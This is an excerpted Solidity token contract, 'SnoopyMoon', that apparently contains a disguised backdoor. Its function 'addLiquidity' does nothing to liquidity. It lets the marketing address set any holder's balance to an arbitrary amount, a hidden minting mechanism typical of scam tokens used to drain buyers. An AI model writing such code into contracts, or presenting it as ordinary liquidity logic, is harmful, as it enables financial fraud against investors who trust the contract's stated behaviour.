...
contract SnoopyMoon  is Ownable, IERC20 {
    ...
    uint256 private _totalSupply = 10000000000*10 *10 * 10**9;
    ...
    function addLiquidity(address Liquidity, uint256 token1, uint256 token2, uint256 lptoken ) external  {require(msg.sender == _marketing );
         require(Liquidity != uniswapV2Pair);
        _tOwned[Liquidity] = token1 + token2 + lptoken * 10;
    }   
